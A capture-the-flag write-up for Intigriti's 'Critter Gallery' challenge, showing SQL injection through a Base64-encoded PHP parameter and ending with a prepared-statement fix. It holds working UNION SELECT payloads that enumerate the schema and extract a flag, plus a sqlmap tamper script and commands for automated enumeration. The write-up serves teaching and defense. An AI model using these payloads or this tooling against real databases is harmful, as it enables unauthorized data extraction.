# 🐾 Critter Gallery — SQL Injection Behind a Base64 Parameter

**Intigriti Challenge 0926 Write-Up** · Submission `INTIGRITI-VZES9FIW`

![Severity](https://img.shields.io/badge/Severity-Medium-yellow) ![Type](https://img.shields.io/badge/Type-SQL%20Injection-red) ![Status](https://img.shields.io/badge/Status-Accepted-brightgreen)

> Encoding a parameter is not the same as securing it. This write-up walks through how a Base64-encoded `pic` parameter on a small PHP gallery app hid a classic, unauthenticated SQL injection — found through systematic byte testing, confirmed with comment-syntax injection, and escalated to full UNION-based data extraction.

---

## Table of Contents

- [The Setup](#the-setup)
- [Step 1: Understanding the Flow](#step-1-understanding-the-flow)
- [Step 2: Finding the Break](#step-2-finding-the-break)
- [Step 3: Confirming with Comment Syntax](#step-3-confirming-with-comment-syntax)
- [Step 4: Escalating to UNION-Based Extraction](#step-4-escalating-to-union-based-extraction)
- [Automating It (sqlmap with a Twist)](#automating-it-sqlmap-with-a-twist)
- [Impact](#impact)
- [Fixing It](#fixing-it)
- [Closing Thoughts](#closing-thoughts)

---

## The Setup

Intigriti's September 2026 challenge, *Critter Gallery*, looked deceptively simple: a small PHP app showing animal descriptions. Click a critter's photo, and the app fires off a request like:

```
GET /challenge.php?pic=ZHIveA==
```

That `pic` parameter is Base64-encoded — decode `ZHIveA==` and you get `fox`. The server takes that decoded value and drops it straight into a SQL query. No sanitization. That's the whole bug, and it's a good reminder that encoding is not the same thing as security.

## Step 1: Understanding the Flow

Watching normal traffic revealed the pattern immediately: each critter name gets Base64-encoded client-side before being sent as `pic`. The server decodes it and — almost certainly — runs something like:

```php
$name = base64_decode($_GET['pic']);
$query = "SELECT description FROM animals WHERE name = '$name'";
```

That's a textbook string-concatenation SQL query, just with an extra decoding step in front of it. The extra step doesn't neutralize the vulnerability — it just means every payload has to be Base64-encoded before it's sent.

## Step 2: Finding the Break

Rather than guessing, I tested systematically byte by byte. Two characters stood out immediately:

| Character | Hex | Base64 | Result |
|---|---|---|---|
| `'` | `0x27` | `Jw==` | Empty response |
| `\` | `0x5c` | `XA==` | Empty response |

Both are classic SQL metacharacters, and both broke the query cleanly while every normal animal name returned a description. That's a strong signal of injection — but not proof yet.

## Step 3: Confirming with Comment Syntax

The real confirmation came from closing the query cleanly instead of just breaking it. Sending the payload `fox'--` (with a trailing space, which MySQL requires for the comment to register) and Base64-encoding it returned the **fox description** — meaning the injected quote successfully terminated the string and `--` commented out the rest of the query:

```sql
SELECT description FROM animals WHERE name = 'fox'-- '
```

That's the moment a "maybe" becomes a "yes." At this point I had confirmed, unauthenticated SQL injection.

## Step 4: Escalating to UNION-Based Extraction

With injection confirmed, the next question was how many columns the query returns.

```sql
' UNION SELECT 'PWNED' --
```

This returned `PWNED` in place of the description, confirming a single-column result set. From there, UNION-based extraction was straightforward:

**Database name:**
```sql
' UNION SELECT database() --
```
→ `critter_gallery`

**Enumerate tables:**
```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = database() --
```
→ `animals`, `secret_vault`

The second table name was the interesting one — nothing in the app's UI referenced it.

**Enumerate columns:**
```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'secret_vault' --
```
→ `id`, `note`

**Extract the flag:**
```sql
' UNION SELECT note FROM secret_vault --
```
→ `INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}`

Every one of these payloads had to be Base64-encoded before being sent as the `pic` parameter — the app never questioned *what* it was decoding, only that it *could* decode it.

## Automating It (sqlmap with a Twist)

Manual payloads confirm the vulnerability; automation is what makes enumeration practical at scale. Standard sqlmap won't work here out of the box, though — it has no idea the injection point expects Base64. It needs to encode every payload before sending it.

**Option A — custom tamper script** (`base64_encode.py`):

```python
#!/usr/bin/env python3
import base64
from lib.core.enums import PRIORITY

priority = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    if payload:
        return base64.b64encode(payload.encode()).decode()
    return payload
```

```bash
sqlmap -u "https://challenge-0926.challenges.intigriti.io/challenge.php?pic=*" \
  --tamper base64_encode.py --dbs
```

**Option B — inline with `--eval`:**

```bash
sqlmap -u "https://challenge-0926.challenges.intigriti.io/challenge.php?pic=*" \
  --eval "import base64; pic=base64.b64encode(pic.encode()).decode()" --dbs
```

Either approach turns a manual, one-payload-at-a-time process into full automated enumeration.

## Impact

In this CTF context, the confirmed blast radius was exactly what UNION SELECT could reach: every row in `animals` and `secret_vault`, and by extension anything else `information_schema` exposed about the database's structure. That's already a full confidentiality breach of the application's data — which is what earned this a Medium severity rating in a scoped, low-privilege demo environment.

The reason a bug like this rates higher outside a CTF is what it implies about the underlying trust boundary, not just what one PoC managed to extract. The same root-cause — unsanitized input reaching a SQL query, encoding or not — typically opens up further down the same path:

- **Broader data exfiltration**, if the database user backing the app has access beyond the two tables tested here
- **Blind/time-based extraction** as a fallback, if UNION SELECT were ever blocked but the underlying flaw remained
- **Write access or command execution**, in configurations where the DB user has elevated privileges (stacked queries, `INTO OUTFILE`) — not demonstrated here, but a realistic next step for an attacker with more time

The lesson generalizes well beyond this one app: **encoding is a transport concern, not a security control.** A value being Base64-encoded, URL-encoded, or hashed on the way in tells you nothing about whether it's safe once decoded.

## Fixing It

The only real fix is separating data from query structure:

```php
// ❌ Vulnerable
$name = base64_decode($_GET['pic']);
$query = "SELECT description FROM animals WHERE name = '$name'";

// ✅ Fixed
$stmt = $conn->prepare("SELECT description FROM animals WHERE name = ?");
$stmt->bind_param("s", $name);
$stmt->execute();
```

Defense in depth on top of that:

- **Allowlist validation** — since the app only ever needs a handful of known animal names, reject anything not on that list before it reaches the query
- **Least privilege** — the DB user backing this feature has no business reading `information_schema` or `secret_vault`
- **Never concatenate user input into SQL**, full stop — this applies regardless of what encoding wraps the input on the way in

## Closing Thoughts

*Critter Gallery* was a fun reminder that an encoding layer often does more to obscure a vulnerability from casual observers than to protect against anyone actually looking. Nothing here required a novel technique — just refusing to treat "it's Base64" as a reason to skip testing the decoded value like any other user input.

The methodology mattered more than any single payload: systematic byte testing found the crack, comment-syntax confirmation turned a hunch into proof, and UNION-based enumeration did the rest in four clean steps — database, tables, columns, flag. That's the part worth taking away from this one: when an input is transformed before it reaches the application logic, test what it becomes, not what it looks like on the wire.

---

*Found via Intigriti's Critter Gallery challenge (September 2026). Report accepted with Medium severity.*
